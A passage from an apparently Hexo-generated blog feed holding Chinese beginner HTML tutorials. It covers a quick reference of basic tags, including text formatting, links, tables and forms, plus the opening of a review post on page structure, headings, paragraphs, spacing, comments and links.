class="headerlink" title="6.1 HTML基本标签"></a>6.1 HTML基本标签</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>最大的标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span> . . . <span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>最小的标题<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> （换行）<br> <span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span> （水平线）<br> <span class="hljs-comment">&lt;!-- 这是注释 --&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2-文本格式化"><a href="#6-2-文本格式化" class="headerlink" title="6.2 文本格式化"></a>6.2 文本格式化</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>粗体文本<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span>计算机代码<span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span>强调文本<span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>斜体文本<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">kbd</span>&gt;</span>键盘输入<span class="hljs-tag">&lt;/<span class="hljs-name">kbd</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>预格式化文本<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span>&gt;</span>更小的文本<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>重要的文本<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">abbr</span>&gt;</span> （缩写）<br><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span> （联系信息）<br><span class="hljs-tag">&lt;<span class="hljs-name">bdo</span>&gt;</span> （文字方向）<br><span class="hljs-tag">&lt;<span class="hljs-name">blockquote</span>&gt;</span> （从另一个源引用的部分）<br><span class="hljs-tag">&lt;<span class="hljs-name">cite</span>&gt;</span> （工作的名称）<br><span class="hljs-tag">&lt;<span class="hljs-name">del</span>&gt;</span> （删除的文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">ins</span>&gt;</span> （插入的文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">sub</span>&gt;</span> （下标文本）<br><span class="hljs-tag">&lt;<span class="hljs-name">sup</span>&gt;</span> （上标文本）<br></code></pre></div></td></tr></table></figure><h3 id="6-3-链接"><a href="#6-3-链接" class="headerlink" title="6.3 链接"></a>6.3 链接</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">普通的链接：<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;链接地址&quot;</span>&gt;</span>链接文本<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>图像链接： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://www.example.com/&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;external nofollow&quot;</span> <span class="hljs-attr">target</span>=<span class="hljs-string">&quot;_blank&quot;</span> &gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;URL&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;替换文本&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <br>邮件链接： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailto:webmaster@example.com&quot;</span>&gt;</span>发送e-mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br>书签： <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;tips&quot;</span>&gt;</span><br>提示部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#tips&quot;</span>&gt;</span>跳到提示部分<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-4-图片"><a href="#6-4-图片" class="headerlink" title="6.4 图片"></a>6.4 图片</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;URL&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;替换文本&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;42&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;42&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-5-样式-区块"><a href="#6-5-样式-区块" class="headerlink" title="6.5 样式/区块"></a>6.5 样式/区块</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">color</span>:red;&#125;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>:blue;&#125;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>文档中的块级元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>文档中的内联元素<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-6-无序列表"><a href="#6-6-无序列表" class="headerlink" title="6.6 无序列表"></a>6.6 无序列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>项目<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-7-有序列表"><a href="#6-7-有序列表" class="headerlink" title="6.7 有序列表"></a>6.7 有序列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">ol</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第一项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>第二项<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">ol</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-8-自定义列表"><a href="#6-8-自定义列表" class="headerlink" title="6.8 自定义列表"></a>6.8 自定义列表</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">dl</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>项目 1<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>描述项目 1<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dt</span>&gt;</span>项目 2<span class="hljs-tag">&lt;/<span class="hljs-name">dt</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">dd</span>&gt;</span>描述项目 2<span class="hljs-tag">&lt;/<span class="hljs-name">dd</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">dl</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-9-表格"><a href="#6-9-表格" class="headerlink" title="6.9 表格"></a>6.9 表格</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">border</span>=<span class="hljs-string">&quot;1&quot;</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>表格标题<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">th</span>&gt;</span>表格标题<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>表格数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span>表格数据<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-10-框架"><a href="#6-10-框架" class="headerlink" title="6.10 框架"></a>6.10 框架</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;demo_iframe.htm&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-11-表单"><a href="#6-11-表单" class="headerlink" title="6.11 表单"></a>6.11 表单</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_form.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post/get&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">size</span>=<span class="hljs-string">&quot;40&quot;</span> <span class="hljs-attr">maxlength</span>=<span class="hljs-string">&quot;50&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">checked</span>=<span class="hljs-string">&quot;checked&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Send&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;reset&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>苹果<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">selected</span>=<span class="hljs-string">&quot;selected&quot;</span>&gt;</span>香蕉<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">option</span>&gt;</span>樱桃<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;comment&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;60&quot;</span> <span class="hljs-attr">cols</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-12-实体"><a href="#6-12-实体" class="headerlink" title="6.12 实体"></a>6.12 实体</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">&lt; 等同于 <span class="hljs-symbol">&amp;lt;</span><br>&gt; 等同于 <span class="hljs-symbol">&amp;gt;</span><br>© 等同于 <span class="hljs-symbol">&amp;copy;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML基础知识复习（一）</title>
    <link href="/2021/05/05/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/05/05/WEB%E5%89%8D%E7%AB%AF-HTML%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML是用于创建网页的语言。我们通过使用HTML标记标签创建html文档来创建网页。HTML代表超文本标记语言。HTML是一种标记语言，它具有标记标签的集合。<br>HTML标签是由尖括号括起来的词，如&lt;html&gt;， &lt;body&gt;。标签通常成对出现，例如&lt;html&gt;和&lt;/html&gt;。<br>一对中的第一个标签是开始标签;第二个标签是结束标签。在上面的示例中，&lt;html&gt;是开始标签，而&lt;/html&gt;是结束标签。<br>我们还可以将开始标签称为起始标签，结束标签称为闭合标签。<br><strong>注意：</strong>并不是所有的标签都有结束标签的！！！<br><strong>注意：</strong>在本文中，有人民币符号￥的，表示自闭合标签，即不需要结束标签的。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="0-网页基础"><a href="#0-网页基础" class="headerlink" title="0.网页基础"></a>0.网页基础</h2><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>页面标题<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是第一个标题<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是第一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><blockquote><ul><li>DOCTYPE声明了文档的类型</li><li>&lt;html&gt;标签是 HTML 页面的根元素，该标签的结束标志为&lt;/html&gt;</li><li>&lt;head&gt;标签包含了文档的元数据（meta），如&lt;meta charset=”utf-8”&gt;定义网页编码格式为utf-8。</li><li>&lt;title&gt;标签定义文档的标题</li><li>&lt;body&gt;标签定义文档的主体，即网页可见的页面内容，该标签的结束标志为&lt;/body&gt;</li><li>&lt;meta&gt; 字符集设置为UTF-8编码。UTF-8是一种常见的字符编码。涵盖了世界上几乎所有的字符和符号。HTML5的默认字符编码为UTF-8。</li></ul></blockquote><h2 id="1-标题（-lt-h-gt-）"><a href="#1-标题（-lt-h-gt-）" class="headerlink" title="1.标题（&lt;h&gt;）"></a>1.标题（&lt;h&gt;）</h2><p>HTML 标题（Heading）是通过 &lt;h1&gt; - &lt;h6&gt; 标签来定义的。<br>六个标题元素，每个元素代表文档中不同级别的内容：<br>&lt;h1&gt; 表示主标题（ the main heading ），&lt;h2&gt; 表示二级子标题（ subheadings ），&lt;h3&gt;表示三级子标题（ sub-subheadings ），&lt;h4&gt;、&lt;h5&gt;、&lt;h6&gt;字体的大小依次递减。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>这是标题1<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>这是标题2<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>这是标题3<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>这是标题4<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h5</span>&gt;</span>这是标题5<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h6</span>&gt;</span>这是标题6<span class="hljs-tag">&lt;/<span class="hljs-name">h6</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-段落（-lt-p-gt-）"><a href="#2-段落（-lt-p-gt-）" class="headerlink" title="2.段落（&lt;p&gt;）"></a>2.段落（&lt;p&gt;）</h2><p>HTML 段落是通过标签&lt;p&gt;来定义的，P是英文paragraph段落的缩写，经常被用来创建一个段落。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是另外一个段落。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="3-空格（-amp-nbsp-）"><a href="#3-空格（-amp-nbsp-）" class="headerlink" title="3.空格（&amp;nbsp;）"></a>3.空格（&amp;nbsp;）</h2><p>无论你用了多少空格（包括空格字符，包括换行），当渲染这些代码的时候，HTML 解释器会将连续出现的空格字符减少为一个单独的空格符，这样做的目的就是为了可读性。</p><p>下面的两个代码片段是等价的，实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗 很 呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗        很<br><br>       呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>如果非要用多个空格的话，可以用 &nbsp; 表示空格，这样写的多个空格会全部表示出来。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗 很 呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>狗 狗  <span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>很<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span>呆 萌。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>这样的用法，上面的两个代码片段的效果不是一样的。</p><h2 id="4-注释（）"><a href="#4-注释（）" class="headerlink" title="4.注释（）"></a>4.注释（<!--注释内容-->）</h2><p>注释是关于 HTML 元素的有用信息。注释使 HTML 文档更易读和可理解。<br>HTML 中的注释以标签&lt;！– 开头，并以 –&gt; 结尾。<br>浏览器将忽略您在这些标记中放置的任何内容。</p><h2 id="5-元素嵌套"><a href="#5-元素嵌套" class="headerlink" title="5.元素嵌套"></a>5.元素嵌套</h2><p>大多数 HTML 元素可以嵌套（可以包含其他 HTML 元素）。HTML 文档由嵌套的 HTML 元素构成。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>This is my first paragraph.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--这是注释内容--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="6-链接（-lt-a-gt-）"><a href="#6-链接（-lt-a-gt-）" class="headerlink" title="6.链接（&lt;a&gt;）"></a>6.链接（&lt;a&gt;）</h2><p>HTML 链接是通过标签&lt;a&gt;来定义的。a标签，也叫anchor（锚点）元素，既可以用来链接到外部地址实现页面跳转功能，也可以链接到当前页面的某部分实现内部导航功能。在<code>href</code>属性中指定链接的地址。</p><h3 id="6-1链接外部"><a href="#6-1链接外部" class="headerlink" title="6.1链接外部"></a>6.1链接外部</h3><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://lichengloong.com/&quot;</span>&gt;</span>这是一个链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> <span class="hljs-comment">&lt;!--这里的链接地址分几种，在后面有记录--&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-2链接内部"><a href="#6-2链接内部" class="headerlink" title="6.2链接内部"></a>6.2链接内部</h3><p>可以创建超链接，使浏览器窗口中的另一个元素进入视图。可以使用CSS样式ID选择器#id创建内部超链接。</p><p>用法实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 